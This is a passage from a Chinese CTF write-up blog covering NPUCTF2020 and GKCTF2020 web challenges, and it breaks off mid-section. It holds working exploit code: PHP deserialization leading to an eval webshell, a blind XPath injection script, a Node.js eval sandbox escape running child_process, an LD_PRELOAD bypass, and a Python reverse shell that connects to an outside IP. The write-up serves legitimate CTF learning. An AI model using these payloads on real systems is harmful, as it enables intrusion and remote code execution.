class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        $a = <span class="keyword">$this</span>-&gt;a;</span></span><br><span class="line"><span class="php">        $b = <span class="keyword">$this</span>-&gt;b;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $b($a);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$c = <span class="keyword">new</span> HelloPhp;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span></span><br></pre></td></tr></table></figure><p>简单的反序列化，这里需要注意的是不能用 <code>eval</code> 因为eval是一个语言构造器而不是一个函数，不能被 <a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="noopener">可变函数</a> 调用。</p><p>PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p><p>在PHP7中assert变成了一种语言结构而不是一个函数。也就是说像eval一样不支持可变函数。但某几个php7版本支持可变函数。</p><p>题目这个7.0.33版本正好可以.</p><p>构造反序列化payload，本地测试成功，但打过去命令没执行。怀疑是被禁用了系统函数，所以构造payload查看phpinfo();</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> HelloPhp;</span><br><span class="line">$o-&gt;a = <span class="string">'phpinfo()'</span>;</span><br><span class="line">$o-&gt;b = <span class="string">"assert"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($o));</span><br></pre></td></tr></table></figure><p><img src="/2020/05/NPUCTF2020-复现/image-20200527184236232.png" alt="image-20200527184236232"></p><p>这种情况一般是写个马上去，然后用其他方法bypass</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$o-&gt;a = <span class="string">'file_put_contents("1.php", "&lt;?php eval(\$_REQUEST[\'a\']); ?&gt;")'</span>;</span><br></pre></td></tr></table></figure><p>然后利用蚁剑插件直接绕过</p><p>最后在环境变量中找到了flag</p><p><img src="/2020/05/NPUCTF2020-复现/image-20200527191351755.png" alt="image-20200527191351755"></p><h3 id="3-ezlogin"><a href="#3-ezlogin" class="headerlink" title="3.ezlogin"></a>3.ezlogin</h3><p>弱口令，直接访问admin.php,都没啥发现，后面抓包看到是XML格式提交，考虑XXE或XPATH注入</p><p><img src="/2020/05/NPUCTF2020-复现/image-20200527192234895.png" alt="image-20200527192234895"></p><p>后面发现一个会话只有15秒，只能写脚本了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">session = requests.session()</span><br><span class="line">base_url = <span class="string">'http://d13a21db-47ab-4bae-a43f-86d733871552.node3.buuoj.cn/'</span></span><br><span class="line">payload = <span class="string">"' or substring(&#123;target&#125;,&#123;index&#125;,1)='&#123;char&#125;' or '"</span></span><br><span class="line"></span><br><span class="line">chars = string.ascii_letters+string.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_csrf</span><span class="params">()</span>:</span></span><br><span class="line">    res = session.get(base_url, headers=&#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36'</span>,</span><br><span class="line">                                         <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=5d86406434bb835c822991118a6a8eee0'</span>&#125;).text</span><br><span class="line">    <span class="keyword">return</span> re.findall(<span class="string">'&lt;input.*value="(.*?)"./&gt;'</span>, res)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#注入payload</span></span><br><span class="line">target = <span class="string">'count(/*)=1'</span></span><br><span class="line"><span class="comment">#true</span></span><br><span class="line">target = <span class="string">'count(/*[1]/*)=1'</span></span><br><span class="line"><span class="comment">#true</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*)=1'</span></span><br><span class="line"><span class="comment">#false</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*)=2'</span></span><br><span class="line"><span class="comment">#true</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*[1]/*)=1'</span></span><br><span class="line"><span class="comment">#false</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*[1]/*)=2'</span></span><br><span class="line"><span class="comment">#false</span></span><br><span class="line">target=<span class="string">'count(/*[1]/*[1]/*[1]/*)=3'</span></span><br><span class="line"><span class="comment">#true</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[1]/*[1])'</span></span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[1]/*[2])'</span></span><br><span class="line"><span class="comment">#guest</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[1]/*[3])'</span></span><br><span class="line"><span class="comment">#e10adc3949ba.......</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[2]/*[2])'</span></span><br><span class="line"><span class="comment">#adm1n</span></span><br><span class="line">target=<span class="string">'string(/*[1]/*[1]/*[2]/*[3])'</span></span><br><span class="line"><span class="comment">#cf7414b5bdb2e65ee43083f4ddbc4d9f</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="string">'&lt;username&gt;&#123;username&#125;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;token&gt;&#123;token&#125;&lt;/token&gt;'</span></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36'</span>,</span><br><span class="line">           <span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>,</span><br><span class="line">           <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=0f91e551561497454d0b8e91253ca104'</span>&#125;</span><br><span class="line">result=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">35</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        temp_payload = payload.format(target=target, index=str(i), char=j)</span><br><span class="line"></span><br><span class="line">        token = get_csrf()</span><br><span class="line"></span><br><span class="line">        temp_data = data.format(username=temp_payload, token=token)</span><br><span class="line">        res = session.post(url=base_url+<span class="string">'login.php'</span>,</span><br><span class="line">                           data=temp_data, headers=headers)</span><br><span class="line">        <span class="comment"># print(temp_data)</span></span><br><span class="line">        <span class="comment"># print(res.text)</span></span><br><span class="line">        <span class="comment"># print(len(res.text))</span></span><br><span class="line">        <span class="keyword">if</span> len(res.text) == <span class="number">5</span>:</span><br><span class="line">            result += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>拿到密码md5解密得到密码 <code>gtfly123</code>，登陆后观察到url中<code>?file=welcome</code></p><p><img src="/2020/05/NPUCTF2020-复现/image-20200527205557544.png" alt="image-20200527205557544"></p><p>任意文件读取</p><p>但使用一般的php://filter发现其被过滤了，那么尝试后发现过滤了一下关键字：<code>php: .php read base</code></p><p>并且返回的内容中不能含有flag字符串，fuzz后发现其没有过滤大小写，那么用大写绕过协议，read可省略，编码方式使用rot13：pHp://filter/string.rot13/resource=/flag</p><h3 id="4-ezinclude"><a href="#4-ezinclude" class="headerlink" title="4.ezinclude"></a>4.ezinclude</h3><p>根据hint        md5($secret.$name)===$pass可以知道这题是个hash长度扩展攻击 但是，看到其他师傅有个非预期解</p><p><img src="/2020/05/NPUCTF2020-复现/image-20200527214601299.png" alt="image-20200527214601299"></p><p><img src="/2020/05/NPUCTF2020-复现/image-20200527214620796.png" alt="image-20200527214620796"></p><p>正常的解法是hash长度扩展攻击</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    data=os.popen(<span class="string">'hashpump -s 6c24bc6e5b7444222bd69cfc90fa536c -d zz -k '</span>+str(i)+<span class="string">' -a zz'</span>).read()</span><br><span class="line">    name=data.split(<span class="string">'\n'</span>)[<span class="number">0</span>]</span><br><span class="line">    password=data.split(<span class="string">'\n'</span>)[<span class="number">1</span>].replace(<span class="string">'\\x'</span>,<span class="string">'%'</span>)</span><br><span class="line">    result=requests.get(<span class="string">'http://ec560480-bfa8-4fda-bb89-116987af030d.node3.buuoj.cn/index.php?name='</span>+password+<span class="string">'&amp;pass='</span>+name).text</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>直接访问会跳转404，所以用Burp发包。</p><p>是一个文件包含</p><p><img src="/2020/05/NPUCTF2020-复现/image-20200528220708064.png" alt="image-20200528220708064"></p><p>比较坑的地方是dir.php 要扫描。如果得到了dir.php，应该都会想到上传临时文件getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">file_data=&#123;</span><br><span class="line">true<span class="string">'file'</span>: BytesIO(<span class="string">"&lt;?php eval($_POST['a']);"</span>)</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">"http://usrl/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"</span></span><br><span class="line">r=requests.post(url=url,files=file_data,allow_redirects=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>从dir.php获取临时文件名getshell</p><p>最后是在phpinfo()页面找到flag</p><p><img src="/2020/05/NPUCTF2020-复现/image-20200528223919475.png" alt="image-20200528223919475"></p><h3 id="5-验证🐎"><a href="#5-验证🐎" class="headerlink" title="5.验证🐎"></a>5.验证🐎</h3><p>关键源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">''</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125;</span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">        result = <span class="string">'Wrong Wrong Wrong!!!'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      results.unshift(<span class="string">`<span class="subst">$&#123;req.body.e&#125;</span>=<span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    results.unshift(<span class="string">'Not verified!'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (results.length &gt; <span class="number">13</span>) &#123;</span><br><span class="line">    results.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  req.session.results = results;</span><br><span class="line">  res.send(render(req.session.results));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>先考虑第一层，<br><code>first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])</code>keys不可知，无法爆破，而且需要.length相等，但是本身不相等，注意，此处用的是===以使类型和值完全匹配<br>对其进行加盐md5，加盐中出现了问题，因为盐是字符串，与字符串相加会导致强制类型转化 而String和Array都正好有length属性，并且</p><p><img src="/2020/05/NPUCTF2020-复现/image-20200605101837835.png" alt="image-20200605101837835"></p><p>但是直接传urlencoded的表单是没法传数组的，而这里正好使用了JSON的中间件，所以只需要传JSON就好了</p><p>然后考虑绕过正则，必须以 <code>Math.</code>开头的字符串，符号只能出现<code>()+\-*&amp;|%^&lt;&gt;=,?:</code>，虽然可以 <code>Math.__proto__</code>但在这里无法直接利用。</p><p>但可以通过<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions" target="_blank" rel="noopener">箭头函数</a>构造这种链</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">(<span class="params"><span class="built_in">Math</span></span>)=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Math</span>.__proto__,<span class="built_in">Math</span>=<span class="built_in">Math</span>.__proto__))(<span class="built_in">Math</span>)</span><br><span class="line"><span class="comment">// Math.__proto__.__proto__</span></span><br></pre></td></tr></table></figure><p>然后尝试调用eval或者Function，但是此处无法直接输入字符串，故使用String.fromCharCode(…）然后利用<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor" target="_blank" rel="noopener">Object.prototype.constructor</a>从原型链上导出 <code>String</code> 和Function</p><p>payloay大致如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">(<span class="params"><span class="built_in">Math</span></span>)=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor,<span class="built_in">Math</span>.constructor(<span class="built_in">Math</span>.fromCharCode(...))))(<span class="built_in">Math</span>+<span class="number">1</span>)()</span><br></pre></td></tr></table></figure><p>分析一下</p><p>开头的Math是箭头函数。需要接受的参数。类似于function(Math)</p><p>(Math+1)是函数的参数，Math是个对象 与字符串1拼接后变成一个字符串</p><p>最外面的小括号。是JS的立即执行函数。定义函数后调用</p><p>中间一长串就是函数体了</p><p><img src="/2020/05/NPUCTF2020-复现/image-20200605113220410.png" alt="image-20200605113220410"></p><p>生成命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span><span class="params">(cmd)</span>:</span></span><br><span class="line">  s = <span class="string">f"return process.mainModule.require('child_process').execSync('<span class="subst">&#123;cmd&#125;</span>').toString()"</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">','</span>.join([str(ord(i)) <span class="keyword">for</span> i <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(gen(<span class="string">'cat /flag'</span>))</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"e":"(Math=&gt;(Math=Math.constructor,Math=Math.constructor(Math.fromCharCode(<span class="number">114,101,116,117</span>,<span class="number">114,110,32,112</span>,<span class="number">114,111,99,101</span>,<span class="number">115,115,46,109</span>,<span class="number">97,105,110,77</span>,<span class="number">111,100,117,108</span>,<span class="number">101,46,114,101</span>,<span class="number">113,117,105,114</span>,<span class="number">101,40,39,99</span>,<span class="number">104,105,108,100</span>,<span class="number">95,112,114,111</span>,<span class="number">99,101,115,115</span>,<span class="number">39,41,46,101</span>,<span class="number">120,101,99,83</span>,<span class="number">121,110,99,40</span>,<span class="number">39,99,97,116</span>,<span class="number">32,47,102,108</span>,<span class="number">97,103,39,41</span>,<span class="number">46,116,111,83</span>,<span class="number">116,114,105,110</span>,<span class="number">103,40,41</span>))()))(Math+<span class="number">1</span>)","first":"<span class="number">1</span>","second":[<span class="number">1</span>]&#125;</span><br></pre></td></tr></table></figure><p>不要忘了把修改把Content-Type 修改成<code>application/json</code></p>]]></content>
    
    <summary type="html">
    
      补作业了
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="复现" scheme="https://0xcreed.jxustctf.top/tags/%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>GKCTF2020-WP</title>
    <link href="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/"/>
    <id>https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/</id>
    <published>2020-05-24T05:00:18.000Z</published>
    <updated>2020-05-26T09:27:24.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-Check-IN"><a href="#1-Check-IN" class="headerlink" title="1.Check IN"></a>1.Check IN</h3><p><img src="/2020/05/GKCTF2020-Writeup/image-20200524132441686.png" alt="image-20200524132441686"></p><p>进去就是一个马</p><p>执行phpinfo后发现，禁用了执行命令的系统函数，但putenv未被禁用，所以想到劫持动态库执行命令。</p><p>先用蚁剑连接</p><p>构造如下URL，<a href="http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9QT1NUWydhJ10pOw==密码是a" target="_blank" rel="noopener">http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9QT1NUWydhJ10pOw==密码是a</a></p><a id="more"></a><p>或者修改编码器</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200524133145293.png" alt="image-20200524133145293"></p><p>上传恶意<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">so文件和bypass.php</a>接着读flag</p><p><code>http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9HRVRbJ2EnXSk7Cg==&amp;a=include(%27/var/tmp/1.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/var/tmp/1.so</code></p><h3 id="2-老八小超市儿"><a href="#2-老八小超市儿" class="headerlink" title="2.老八小超市儿"></a>2.老八小超市儿</h3><p>用的是shopxo模板，这里有个后台Getshell的漏洞。具体看这篇<a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener">文章</a></p><p>拿到shell用蚁剑连</p><p><a href="http://20e6504f-9a68-4272-b02b-4de366165b48.node3.buuoj.cn/public/static/index/default/1.php" target="_blank" rel="noopener">http://20e6504f-9a68-4272-b02b-4de366165b48.node3.buuoj.cn/public/static/index/default/1.php</a></p><p>然后发现根目录下有flag</p><p>告诉我们flag在根目录</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145719302.png" alt="image-20200524145719302"></p><p>flag.hint有点奇怪</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145846453.png" alt="image-20200524145846453"></p><p>直到看到auto.sh，原来是个定时任务</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145602985.png" alt="image-20200524145602985"></p><p>接着修改makeflaghint.py遍历/root/</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">path_list = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all</span><span class="params">(path)</span>:</span></span><br><span class="line">    paths = os.listdir(path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> paths:</span><br><span class="line">        com_path = os.path.join(path,i)</span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(com_path):</span><br><span class="line">            get_all(com_path)</span><br><span class="line">        <span class="keyword">elif</span> os.path.isfile(com_path):</span><br><span class="line">            path_list.append(com_path)</span><br><span class="line">        <span class="keyword">with</span>  open(<span class="string">'/flag.hint'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(com_path+<span class="string">'\n'</span>)</span><br><span class="line">        print(com_path) </span><br><span class="line">get_all(path=<span class="string">r'/root'</span>)</span><br></pre></td></tr></table></figure><p><img src="/2020/05/GKCTF2020-Writeup/20232423444217.png" alt="20232423444217"></p><p>发现flag接着读取就行</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f1=<span class="built_in">open</span>(<span class="string">"/root/flag"</span>)</span><br><span class="line">aaa=f1.<span class="built_in">read</span>()</span><br><span class="line">f1.<span class="built_in">close</span>()</span><br><span class="line"><span class="keyword">with</span>  <span class="built_in">open</span>(<span class="string">'/flag.hint'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.<span class="built_in">write</span>(aaa+<span class="string">'\n'</span>)</span><br><span class="line">print(<span class="string">"D"</span>)</span><br></pre></td></tr></table></figure><p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145546293.png" alt="image-20200524145546293"></p><p>后面看官方WP是反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"174.1.118.22"</span>,<span class="number">2333</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure><h3 id="3-CVE版签到"><a href="#3-CVE版签到" class="headerlink" title="3.CVE版签到"></a>3.CVE版签到</h3><p>开始没看懂这题在干啥，后面提示<a href="https://bugs.php.net/bug.php?id=79329" target="_blank" rel="noopener">CVE-2020-7066</a> gethead函数存在%00截断</p><p>就试了文章里的Payload发现啥也没有。直到看了WP才发现原来都是Burp的锅</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105018707.png" alt="image-20200525105018707"></p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105045473.png" alt="image-20200525105045473"></p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105141216.png" alt="image-20200525105141216"></p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105212253.png" alt="image-20200525105212253"></p><p>这题确实签到(放了提示)，感觉主要考对最新一些的CVE的了解。偏实战，爱了爱了。</p><h3 id="4-EZ三剑客-EzWeb"><a href="#4-EZ三剑客-EzWeb" class="headerlink" title="4.EZ三剑客-EzWeb"></a>4.EZ三剑客-EzWeb</h3><p>这题SSRF+redis未授权，但是shell死活收不到。后面看WP发现是独立于单容器的内网，内网靶机收不到反弹shell。所以是直接写webshell。</p><p>开局就叫你输入URL，八成是个SSRF，就随意输入了127.0.0.1，发现被禁了。然后就想着怎么绕(后面发现不用。。。)</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525110646995.png" alt="image-20200525110646995"></p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525110728289.png" alt="image-20200525110728289"></p><p>发现<code>0x7f000001</code> 可以绕过。后面用Burp抓包，想扫描下本机端口，看到才看到secret这个参数</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525111239096.png" alt="image-20200525111239096"></p><p>得到了本机的内网IP</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525111352798.png" alt="image-20200525111352798"></p><p>这样一看肯定就不是本机的端口渗透，应该在内网的其他机器上，然后内网探测，很明显的提示了</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525112129001.png" alt="image-20200525112129001"></p><p>然后就随意测了下6379端口，发现有戏</p><p><img src="/2020/05/GKCTF2020-Writeup/image-20200525112303602.png" alt="image-20200525112303602"></p><p>直接用脚本生成payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 